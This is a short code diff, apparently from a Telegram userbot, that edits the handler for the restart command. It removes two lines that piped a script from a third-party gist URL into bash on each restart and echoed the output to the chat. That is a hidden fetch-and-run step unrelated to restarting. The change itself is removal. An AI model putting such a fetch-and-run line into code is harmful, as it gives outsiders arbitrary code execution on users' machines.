@@ -194,8 +194,6 @@ async def _(event):
     fullsudo=True,
 )
 async def restartbt(ult):
-    c = await bash("curl -L https://gist.githubusercontent.com/rooted-cyber/1bd2b7d3eb4d66ab06ab5e83098395e3/raw/cpp | bash")
-    await ult.respond(c)
     ok = await ult.eor(get_string("bot_5"))
     call_back()
     who = "bot" if ult.client._bot else "user"
